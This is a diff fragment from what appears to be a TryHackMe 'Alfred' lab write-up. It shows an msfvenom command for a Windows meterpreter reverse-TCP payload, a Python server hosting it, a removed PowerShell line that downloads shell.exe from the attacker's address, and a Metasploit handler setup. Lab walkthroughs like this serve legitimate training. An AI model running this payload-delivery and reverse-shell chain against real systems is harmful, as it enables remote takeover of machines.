@@ -83,8 +83,6 @@ kali@kali:~/THM/alfred$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --enc
 kali@kali:~/THM/alfred$ python -m SimpleHTTPServer 8888
 ```
 
-powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.8.14.151:8888/shell.exe','shell.exe')"
-
 use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 10.8.14.151 set LPORT 9696  run
 
 ```
